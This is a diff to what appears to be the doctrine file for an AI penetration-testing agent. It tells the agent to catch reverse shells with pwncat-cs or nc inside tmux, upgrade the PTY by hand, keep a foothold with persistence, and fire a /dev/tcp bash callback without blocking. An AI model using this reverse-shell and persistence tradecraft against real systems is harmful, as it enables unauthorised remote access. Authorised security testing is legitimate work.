@@ -26,10 +26,14 @@ Doctrine:
   the next key, exactly as a human would look at the terminal before typing.
 - **Never** run a blocking/interactive command as a plain one-shot — it will hang the loop.
   If something might wait for input, it goes in tmux.
-- **Catch reverse shells with `pwncat-cs -lp <port>`, not bare `nc -lvnp`** (it is installed). pwncat
-  auto-upgrades the PTY, gives a stable prompt, a synchronous command API, and — the part that matters
-  most — **reconnect + persistence**, so losing the shell is not losing your foothold. Hold it in its own
-  `<tmux_base>_<slug>` session and keep it alive.
+- **tmux stays the base for every interactive session** (reverse/bind shells, `ssh`, `su`, `evil-winrm`,
+  `msfconsole`, db clients, handlers) — the tool runs *inside* a tmux session; nothing below replaces tmux.
+- **For a reverse-shell catcher, prefer `pwncat-cs -lp <port>` WHEN IT RUNS, else fall back to
+  `nc -lvnp <port>` + a manual PTY upgrade.** pwncat (in the project venv — `scripts/setup_env.sh`) adds
+  PTY auto-upgrade, a stable prompt, a synchronous command API, and **reconnect + persistence**. But treat
+  it as an enhancement, not a hard dependency: if `pwncat-cs` errors on launch, do **not** get stuck on it
+  — catch with `nc` in tmux and upgrade the PTY by hand (`python3 -c 'import pty;pty.spawn("/bin/bash")'`,
+  then `stty raw -echo; fg`). Either way hold it in its own `<tmux_base>_<slug>` session and keep it alive.
 - **Make the callback non-blocking so the vector stays re-fireable — a required habit on the first
   foothold, not an optimization.** A reverse shell fired *synchronously* (a worker/handler that calls
   `system("… bash -i >& /dev/tcp/… …")` and then blocks) pins that process to the first shell: if the
